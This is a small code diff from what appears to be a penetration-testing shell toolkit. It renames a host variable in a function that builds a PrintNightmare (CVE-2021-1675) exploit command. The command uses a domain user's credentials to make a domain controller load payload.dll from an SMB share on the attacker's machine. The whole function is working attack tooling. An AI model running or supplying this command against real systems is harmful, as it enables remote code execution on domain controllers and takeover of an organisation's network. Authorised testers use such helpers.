@@ -67,11 +67,11 @@ nb-ad-cve-printnightmare-scan() {
 nb-ad-cve-printnightmare-exploit() {
     __check-project
     __ask "Enter the IP of domain controller"
-    nb-vars-set-rhost
+    nb-vars-set-dchost
     nb-vars-set-domain
     nb-vars-set-user
     nb-vars-set-pass
     nb-vars-set-lhost
 
-    print -z "sudo python3 CVE-2021-1675.py ${__DOMAIN}/${__USER}:'${_PASS}'@${__RHOST} '\\\\${__LHOST}\\CompData\\payload.dll'"
+    print -z "sudo python3 CVE-2021-1675.py ${__DOMAIN}/${__USER}:'${_PASS}'@${__DCHOST} '\\\\${__LHOST}\\CompData\\payload.dll'"
 }
